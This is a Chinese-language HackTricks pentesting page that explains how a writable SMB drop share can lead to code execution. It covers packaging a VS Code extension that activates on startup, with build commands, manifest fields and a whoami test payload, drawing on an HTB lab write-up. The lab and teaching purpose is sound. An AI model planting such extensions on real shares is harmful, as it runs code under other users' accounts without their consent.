# VS Code Extension Drop-Share 执行

{{#include ../banners/hacktricks-training.md}}

VS Code 扩展和 Visual Studio VSSDK 扩展都使用 `.vsix` 打包，但它们的清单和运行时不同。可写的 SMB drop share 只有在其他用户或部署作业将其中的包安装到 VS Code 时，才会成为执行路径。随后，扩展的 `activate()` 函数会以该用户的权限在扩展宿主中运行。仅仅将 `.vsix` 写入共享目录并不会执行它。<sup>[[1]](#references)[[2]](#references)</sup>

## 包和激活工作流

首先确认使用方的 VS Code 版本，并确认共享目录确实已同步或安装。生成一个 TypeScript 扩展，并将预期的 Node.js 操作放入 `activate()`。使用无需用户选择命令即可触发的激活事件，例如 `onStartupFinished`，然后编译并打包扩展。`engines.vscode` 是**运行时兼容性门槛**；让 `@types/vscode` 与目标 API 版本匹配，是构建时的兼容性措施，而非安装时的要求。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

对于运行 VS Code 1.118 的编辑器，相关的 `package.json` 字段如下：<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

一个最简的 `activate()` 检查可以在扩展宿主中执行命令并记录其输出。只有在确认该 package 已在预期的 account/session 中激活后，才替换测试操作。`onStartupFinished` 事件会在启动后触发，因此在 editor 实际启动且扩展已安装并启用之前，不能据此认定代码已执行。<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

攻击者只要对 drop share 具有写入权限，就可以上传经过测试的 package 并等待使用该 package 的 job。在 Checkpoint 示例中，恢复后的账户凭借其 share 访问权限获得了该写入权限；低权限初始账户只能读取 share。请区分这两个前提。对于 **Visual Studio** extensions，请参阅单独的 [Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md) 章节，而不要使用此 VS Code 工作流程。<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB：Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - 激活事件](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - 发布扩展](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
